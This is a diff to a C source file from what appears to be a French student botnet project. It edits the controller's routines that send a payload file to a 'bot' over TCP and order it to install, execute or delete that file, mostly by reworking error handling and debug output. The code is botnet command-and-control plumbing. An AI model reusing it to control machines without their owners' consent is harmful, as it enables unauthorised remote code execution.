@@ -20,8 +20,8 @@
  * 
  */
 void send_file_tcp(void *s, char *filename)
-{ 
-    
+{
+
     int socket_tcp = *((int *)s);
     int sent_bytes = 0;
     char file_size[256];
@@ -40,15 +40,13 @@ void send_file_tcp(void *s, char *filename)
     //Récupère la taille du fichier à envoyer
     if (fstat(fd, &file_stat) < 0)
     {
-        perror("Bla");
-        exit(EXIT_FAILURE);
+        perror("Error in getting file size \n");
     }
 
     //Sending file name de la charge utile
     if (send(socket_tcp, filename, TAILLE_FILENAME, 0) < 0)
     {
-        perror("Error on sending file size");
-        exit(EXIT_FAILURE);
+        perror("Error on sending file size \n");
     }
 
     sprintf(file_size, "%ld", file_stat.st_size);
@@ -56,7 +54,6 @@ void send_file_tcp(void *s, char *filename)
     if (send(socket_tcp, file_size, sizeof(file_size), 0) < 0)
     {
         perror("Error on sending file size");
-        exit(EXIT_FAILURE);
     }
     printf("Sent file Size: %s bytes\n", file_size);
 
@@ -66,14 +63,11 @@ void send_file_tcp(void *s, char *filename)
     /* Envoie le fichier en plusieurs fois : https://stackoverflow.com/questions/11952898/c-send-and-receive-file */
     while (((sent_bytes = sendfile(socket_tcp, fd, &offset, BUFSIZ)) > 0) && (remain_data > 0))
     {
-        printf("1. Sent %d bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
+        DEBUG_PRINT(("Sent %d bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data));
         remain_data -= sent_bytes;
-        printf("2. Sent sent %d bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
+        DEBUG_PRINT(("2. Sent sent %d bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data));
     }
-    printf("All file has been sended\n");
-    // Test : Que se passe-t-il si on attend un certain moment avant de close la socket ?
-    close(fd); // close the file
-    // printf("File Sent successfully !!! \n");
+    close(fd); // close the filE
     close(socket_tcp);
 }
 
@@ -93,23 +87,29 @@ void send_command_tcp(ordre_t *ordre)
     char num = ordre->cmd;
     char *filename = ordre->filename;
     char msg_recu[TAILLE_MSG_PROTOCOLE];
+    //bot_t bot;
+    char msg;
     switch (num)
     {
     case '1': //Demande d'envoyer le statut du bot
         printf("Demande d'avoir le 'status' d'un bot\n");
         write(socket_tcp, &num, sizeof(char));
-        if (receiveTCP(socket_tcp, msg_recu, TAILLE_MSG_PROTOCOLE) < 0)
+        if (receiveTCP(socket_tcp, &msg, sizeof(char)) < 0)
         {
             printf("Erreur dans la réception du msg_recu \n");
-            exit(1);
         }
-        printf(" Le bot m'a répondu que son status est : %s\n", msg_recu);
+        printf("L'info du bot est de %c\n", msg);
         break;
     case '2': //Demande d'installation puis l'envoie du fichier à envoyer
         printf("Demande d'installation' d'un fichier\n");
         write(socket_tcp, &num, sizeof(char));
         write(socket_tcp, filename, TAILLE_FILENAME);
         send_file_tcp((void *)&socket_tcp, filename);
+        if (receiveTCP(socket_tcp, msg_recu, TAILLE_MSG_PROTOCOLE) < 0)
+        {
+            fprintf(stderr, "Erreur dans la réception du renvoie du install_charge \n");
+        }
+        printf("Le bot m'a répondu le code : %s\n", msg_recu);
         break;
 
     case '3': //Demande d'exécuter le fichier
@@ -123,8 +123,7 @@ void send_command_tcp(ordre_t *ordre)
         write(socket_tcp, filename, TAILLE_FILENAME);
         if (receiveTCP(socket_tcp, msg_recu, TAILLE_MSG_PROTOCOLE) < 0)
         {
-            printf("Erreur dans la réception du msg_recu \n");
-            exit(1);
+            fprintf(stderr, "Erreur dans la réception du msg_recu \n");
         }
         printf(" Le bot m'a répondu que le résultat de son exéc est : %s\n", msg_recu);
         break;
@@ -132,14 +131,20 @@ void send_command_tcp(ordre_t *ordre)
         printf("Demande de suppression d'un fichier\n");
         write(socket_tcp, &num, sizeof(char));
         write(socket_tcp, filename, TAILLE_FILENAME);
+        if (receiveTCP(socket_tcp, msg_recu, TAILLE_MSG_PROTOCOLE) < 0)
+        {
+            fprintf(stderr, "Erreur dans la réception du renvoie du rm_charge \n");
+        }
+        printf("Le bot m'a répondu le code : %s\n", msg_recu);
         break;
     case '6': //Demande de quitter la connexion
         printf("Demande de quitter la connexion\n");
         write(socket_tcp, &num, sizeof(char));
         break;
     default:
-        printf("Erreur\n");
-        exit(-1);
+        fprintf(stderr, "[send_command_tcp]: Erreur dans le code commande recu\n");
+        break;
     }
+    free(ordre->filename);
     close(socket_tcp);
 }
